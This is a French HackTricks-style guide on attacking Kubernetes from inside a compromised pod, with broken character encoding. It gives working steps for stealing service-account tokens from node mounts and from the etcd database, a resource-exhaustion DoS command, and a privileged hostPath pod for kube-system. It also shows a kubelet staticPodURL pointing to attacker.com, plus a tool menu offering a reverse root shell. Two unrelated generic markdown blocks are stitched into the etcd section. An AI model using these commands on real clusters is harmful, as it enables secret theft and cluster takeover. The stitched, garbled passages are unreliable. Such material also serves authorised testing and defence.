# Attaquer Kubernetes depuis l'int√©rieur d'un Pod

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Sortie du Pod**

**Si vous avez de la chance, vous pourriez √™tre capable de vous √©chapper du pod vers le n≈ìud :**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### S'√©chapper du pod

Pour essayer de s'√©chapper du pod, vous pourriez avoir besoin d'**escalader les privil√®ges** d'abord, voici quelques techniques pour le faire :

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Vous pouvez v√©rifier ces **sorties de docker pour essayer de vous √©chapper** d'un pod que vous avez compromis :

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Abuser des privil√®ges Kubernetes

Comme expliqu√© dans la section sur **l'√©num√©ration de kubernetes** :

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Habituellement, les pods sont ex√©cut√©s avec un **jeton de compte de service** √† l'int√©rieur. Ce compte de service peut avoir certains **privil√®ges attach√©s** que vous pourriez **abuser** pour vous **d√©placer** vers d'autres pods ou m√™me pour **vous √©chapper** vers les n≈ìuds configur√©s √† l'int√©rieur du cluster. V√©rifiez comment dans :

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Abuser des privil√®ges Cloud

Si le pod est ex√©cut√© √† l'int√©rieur d'un **environnement cloud**, vous pourriez √™tre capable de **r√©cup√©rer un jeton depuis le point de terminaison des m√©tadonn√©es** et d'escalader les privil√®ges en l'utilisant.

## Rechercher des services r√©seau vuln√©rables

Comme vous √™tes √† l'int√©rieur de l'environnement Kubernetes, si vous ne pouvez pas escalader les privil√®ges en abusant des privil√®ges actuels du pod et que vous ne pouvez pas vous √©chapper du conteneur, vous devriez **rechercher des services potentiellement vuln√©rables.**

### Services

**√Ä cette fin, vous pouvez essayer d'obtenir tous les services de l'environnement kubernetes :**
```
kubectl get svc --all-namespaces
```
Par d√©faut, Kubernetes utilise un sch√©ma de r√©seau plat, ce qui signifie que **tout pod/service au sein du cluster peut communiquer avec les autres**. Les **namespaces** au sein du cluster **ne disposent d'aucune restriction de s√©curit√© r√©seau par d√©faut**. Quiconque dans le namespace peut communiquer avec d'autres namespaces.

### Analyse

Le script Bash suivant (tir√© d'un [atelier Kubernetes](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s_cheatsheet.md)) installera et analysera les plages d'adresses IP du cluster kubernetes :
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Consultez la page suivante pour apprendre comment vous pourriez **attaquer des services sp√©cifiques √† Kubernetes** pour **compromettre d'autres pods/tout l'environnement** :

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### √âcoute clandestine

Dans le cas o√π le **pod compromis ex√©cute un service sensible** o√π d'autres pods doivent s'authentifier, vous pourriez √™tre en mesure d'obtenir les identifiants envoy√©s par les autres pods en **√©coutant les communications locales**.

## Usurpation de r√©seau

Par d√©faut, des techniques comme l'**usurpation ARP** (et gr√¢ce √† cela l'**usurpation DNS**) fonctionnent dans le r√©seau Kubernetes. Ainsi, √† l'int√©rieur d'un pod, si vous avez la capacit√© **NET\_RAW** (qui est pr√©sente par d√©faut), vous serez capable d'envoyer des paquets r√©seau personnalis√©s et de r√©aliser des **attaques MitM via l'usurpation ARP pour tous les pods ex√©cut√©s sur le m√™me n≈ìud.**\
De plus, si le **pod malveillant** est ex√©cut√© sur le **m√™me n≈ìud que le serveur DNS**, vous serez en mesure de r√©aliser une **attaque d'usurpation DNS pour tous les pods dans le cluster**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## DoS de n≈ìud

Il n'y a pas de sp√©cification de ressources dans les manifestes Kubernetes et de **limites appliqu√©es** pour les conteneurs. En tant qu'attaquant, nous pouvons **consommer toutes les ressources o√π le pod/d√©ploiement s'ex√©cute** et priver d'autres ressources, provoquant ainsi un DoS pour l'environnement.

Cela peut √™tre fait avec un outil tel que [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng) :
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
Vous pouvez voir la diff√©rence pendant l'ex√©cution de `stress-ng` et apr√®s.
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Post-Exploitation d'un n≈ìud

Si vous avez r√©ussi √† **sortir du conteneur**, vous trouverez des √©l√©ments int√©ressants dans le n≈ìud :

* Le processus **Container Runtime** (Docker)
* Plus de **pods/conteneurs** en cours d'ex√©cution dans le n≈ìud que vous pouvez exploiter comme celui-ci (plus de tokens)
* L'ensemble du **syst√®me de fichiers** et de l'**OS** en g√©n√©ral
* Le service **Kube-Proxy** en √©coute
* Le service **Kubelet** en √©coute. V√©rifiez les fichiers de configuration :
* R√©pertoire : `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* Autres **fichiers communs √† kubernetes** :
* `$HOME/.kube/config` - **Configuration Utilisateur**
* `/etc/kubernetes/kubelet.conf` - **Configuration R√©guli√®re**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **Configuration de D√©marrage**
* `/etc/kubernetes/manifests/etcd.yaml` - **Configuration etcd**
* `/etc/kubernetes/pki` - **Cl√© Kubernetes**

### Trouver le kubeconfig du n≈ìud

Si vous ne trouvez pas le fichier kubeconfig dans l'un des chemins pr√©c√©demment mentionn√©s, **v√©rifiez l'argument `--kubeconfig` du processus kubelet** :
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### Voler des Secrets
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
Le script [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) va automatiquement **r√©cup√©rer les jetons des autres pods et v√©rifier s'ils ont la permission** que vous recherchez (au lieu de v√©rifier un par un) :
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### DaemonSets privil√©gi√©s

Un DaemonSet est un **pod** qui sera **ex√©cut√©** sur **tous les n≈ìuds du cluster**. Par cons√©quent, si un DaemonSet est configur√© avec un **compte de service privil√©gi√©**, dans **TOUS les n≈ìuds**, vous pourrez trouver le **jeton** de ce **compte de service privil√©gi√©** que vous pourriez exploiter.

L'exploit est le m√™me que dans la section pr√©c√©dente, mais vous ne d√©pendez plus de la chance.

### Pivoter vers le Cloud

Si le cluster est g√©r√© par un service cloud, g√©n√©ralement le **N≈ìud aura un acc√®s diff√©rent au point de terminaison des m√©tadonn√©es** que le Pod. Par cons√©quent, essayez d'**acc√©der au point de terminaison des m√©tadonn√©es depuis le n≈ìud** (ou depuis un pod avec hostNetwork sur True) :

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Voler etcd

Si vous pouvez sp√©cifier le [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) du n≈ìud qui ex√©cutera le conteneur, obtenez un shell √† l'int√©rieur d'un n≈ìud de contr√¥le et r√©cup√©rez la base de donn√©es **etcd** :
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
Les n≈ìuds du plan de contr√¥le ont le **r√¥le master** et dans **les clusters g√©r√©s par le cloud, vous ne pourrez rien ex√©cuter sur eux**.

#### Lire les secrets depuis etcd

Si vous pouvez ex√©cuter votre pod sur un n≈ìud du plan de contr√¥le en utilisant le s√©lecteur `nodeName` dans la sp√©cification du pod, vous pourriez avoir un acc√®s facile √† la base de donn√©es `etcd`, qui contient toute la configuration du cluster, y compris tous les secrets.

Ci-dessous se trouve une m√©thode rapide et peu orthodoxe pour r√©cup√©rer les secrets depuis `etcd` s'il est ex√©cut√© sur le n≈ìud du plan de contr√¥le sur lequel vous vous trouvez. Si vous souhaitez une solution plus √©l√©gante qui d√©ploie un pod avec l'utilitaire client `etcdctl` et utilise les identifiants du n≈ìud du plan de contr√¥le pour se connecter √† etcd o√π qu'il soit ex√©cut√©, consultez [cet exemple de manifeste](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) de @mauilion.

**V√©rifiez si `etcd` est ex√©cut√© sur le n≈ìud du plan de contr√¥le et voyez o√π se trouve la base de donn√©es (Ceci est sur un cluster cr√©√© par `kubeadm`)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
# Attaquer Kubernetes de l'int√©rieur d'un Pod

Lorsque vous effectuez un pentesting sur un cluster Kubernetes, une des premi√®res √©tapes consiste √† √©valuer le niveau de s√©curit√© √† partir de l'int√©rieur d'un pod. Voici quelques techniques pour commencer.

## √ânum√©ration des services internes

Une fois √† l'int√©rieur d'un pod, vous pouvez utiliser des outils comme `nmap` ou `curl` pour d√©couvrir des services internes non expos√©s au public.

## Exploitation des r√¥les RBAC

Les r√¥les RBAC (Role-Based Access Control) d√©terminent ce que les utilisateurs et les services peuvent faire. Examiner les r√¥les attribu√©s √† votre pod peut r√©v√©ler des permissions excessives qui peuvent √™tre exploit√©es.

## Acc√®s au serveur API de Kubernetes

Le serveur API est le c≈ìur de Kubernetes. Un acc√®s non autoris√© peut permettre de contr√¥ler l'ensemble du cluster. Utilisez `kubectl` pour tester votre acc√®s.

## Exfiltration de secrets

Kubernetes stocke des secrets qui peuvent contenir des informations sensibles. Trouvez et extrayez ces secrets pour obtenir des donn√©es pr√©cieuses.

## √âcoute du trafic r√©seau

Si votre pod a les bonnes permissions, vous pourriez √™tre capable d'√©couter le trafic r√©seau pour d√©tecter des informations sensibles qui transitent.

## Escalade de privil√®ges

Cherchez des vuln√©rabilit√©s dans le cluster qui pourraient vous permettre d'augmenter vos privil√®ges au-del√† de ceux initialement accord√©s √† votre pod.

## Conclusion

Attaquer un cluster Kubernetes de l'int√©rieur peut r√©v√©ler des faiblesses non apparentes de l'ext√©rieur. Utilisez ces techniques avec prudence et toujours dans le cadre d'un pentesting autoris√©.
```
```bash
data-dir=/var/lib/etcd
```
**Afficher les donn√©es dans la base de donn√©es etcd :**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Extrayez les jetons de la base de donn√©es et affichez le nom du compte de service**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**M√™me commande, mais avec des greps pour ne retourner que le jeton par d√©faut dans l'espace de noms kube-system**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
# Attaquer Kubernetes de l'int√©rieur d'un Pod

Lorsque vous effectuez un pentesting sur un cluster Kubernetes, une des premi√®res √©tapes consiste √† √©valuer ce que vous pouvez faire depuis un pod compromis. Voici quelques techniques pour attaquer Kubernetes de l'int√©rieur d'un pod.

## √ânum√©ration des ressources

Une fois √† l'int√©rieur d'un pod, vous pouvez utiliser `kubectl` pour √©num√©rer les ressources disponibles. Cela peut vous aider √† comprendre la configuration du cluster et √† identifier les cibles potentielles.

### R√©cup√©rer les informations du cluster

Pour obtenir des informations sur le cluster, ex√©cutez:

```bash
kubectl cluster-info
```

### Lister tous les namespaces

Les namespaces sont utilis√©s pour s√©parer les ressources dans un cluster. Pour les lister, utilisez:

```bash
kubectl get namespaces
```

### Lister les pods dans tous les namespaces

Pour voir tous les pods dans tous les namespaces, ex√©cutez:

```bash
kubectl get pods --all-namespaces
```

## Exploitation des r√¥les RBAC

Kubernetes utilise RBAC (Role-Based Access Control) pour g√©rer les autorisations. Si vous avez acc√®s √† un r√¥le avec des permissions √©lev√©es, vous pourriez √™tre capable d'exploiter cela.

### V√©rifier les r√¥les et les r√¥les li√©s

Pour voir les r√¥les et les r√¥les li√©s disponibles, utilisez:

```bash
kubectl get roles,rolebindings --all-namespaces
```

### Tester les permissions du r√¥le

Pour tester les permissions d'un r√¥le, vous pouvez essayer de cr√©er ou de modifier des ressources.

## Exfiltration de donn√©es

Si vous trouvez des donn√©es sensibles, vous pourriez vouloir les exfiltrer hors du cluster.

### Trouver des secrets

Kubernetes stocke des informations sensibles comme des secrets. Pour les trouver, utilisez:

```bash
kubectl get secrets --all-namespaces
```

### Lire le contenu d'un secret

Pour lire le contenu d'un secret, ex√©cutez:

```bash
kubectl describe secret <nom_du_secret> -n <namespace>
```

## √âl√©vation de privil√®ges

Si vous trouvez une faille dans la configuration ou dans les permissions, vous pourriez √™tre en mesure d'obtenir des privil√®ges plus √©lev√©s.

### Exploiter les pods vuln√©rables

Cherchez des pods qui tournent avec des privil√®ges √©lev√©s ou qui ont des configurations vuln√©rables.

### Utiliser des conteneurs d'attaque

Vous pouvez d√©ployer vos propres conteneurs qui sont con√ßus pour exploiter le cluster.

## Conclusion

Attaquer Kubernetes de l'int√©rieur d'un pod peut r√©v√©ler des faiblesses significatives dans la s√©curit√© du cluster. Utilisez ces techniques avec prudence et toujours dans le cadre d'un pentesting autoris√©.
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Persistance des Pods Statiques/Miroirs

_Les Pods Statiques_ sont g√©r√©s directement par le d√©mon kubelet sur un n≈ìud sp√©cifique, sans que le serveur API ne les observe. Contrairement aux Pods g√©r√©s par le plan de contr√¥le (par exemple, un D√©ploiement) ; √† la place, le **kubelet surveille chaque Pod statique** (et le red√©marre s'il √©choue).

Par cons√©quent, les Pods statiques sont toujours **li√©s √† un Kubelet** sur un n≈ìud sp√©cifique.

Le **kubelet essaie automatiquement de cr√©er un Pod miroir sur le serveur API Kubernetes** pour chaque Pod statique. Cela signifie que les Pods ex√©cut√©s sur un n≈ìud sont visibles sur le serveur API, mais ne peuvent pas √™tre contr√¥l√©s √† partir de l√†. Les noms des Pods seront suffix√©s avec le nom d'h√¥te du n≈ìud pr√©c√©d√© d'un trait d'union.

{% hint style="danger" %}
Le **`spec` d'un Pod statique ne peut pas faire r√©f√©rence √† d'autres objets API** (par exemple, ServiceAccount, ConfigMap, Secret, etc.). Donc **vous ne pouvez pas abuser de ce comportement pour lancer un pod avec un serviceAccount arbitraire** sur le n≈ìud actuel pour compromettre le cluster. Mais vous pourriez utiliser cela pour ex√©cuter des pods dans diff√©rents espaces de noms (au cas o√π cela serait utile pour une raison quelconque).
{% endhint %}

Si vous √™tes √† l'int√©rieur de l'h√¥te du n≈ìud, vous pouvez le faire cr√©er un **Pod statique √† l'int√©rieur de lui-m√™me**. C'est assez utile car cela pourrait vous permettre de **cr√©er un pod dans un espace de noms diff√©rent** comme **kube-system**.

Pour cr√©er un Pod statique, la [**documentation est d'une grande aide**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). Vous avez essentiellement besoin de 2 choses :

* Configurer le param√®tre **`--pod-manifest-path=/etc/kubernetes/manifests`** dans le **service kubelet**, ou dans la **configuration kubelet** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) et red√©marrer le service
* Cr√©er la d√©finition sur la **d√©finition du pod** dans **`/etc/kubernetes/manifests`**

**Une autre mani√®re plus discr√®te serait de :**

* Modifier le param√®tre **`staticPodURL`** du fichier de configuration de **kubelet** et d√©finir quelque chose comme `staticPodURL: http://attacker.com:8765/pod.yaml`. Cela fera en sorte que le processus kubelet cr√©e un **Pod statique** en obtenant la **configuration √† partir de l'URL indiqu√©e**.

**Exemple** de configuration de **pod** pour cr√©er un pod privil√©gi√© dans **kube-system** pris de [**ici**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/) :
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### Suppression de pods + n≈ìuds non planifiables

Si un attaquant a **compromis un n≈ìud** et qu'il peut **supprimer des pods** d'autres n≈ìuds et **rendre d'autres n≈ìuds incapables d'ex√©cuter des pods**, les pods seront relanc√©s dans le n≈ìud compromis et il pourra **voler les jetons** ex√©cut√©s dans ceux-ci.\
Pour [**plus d'informations, suivez ces liens**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Outils Automatiques

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
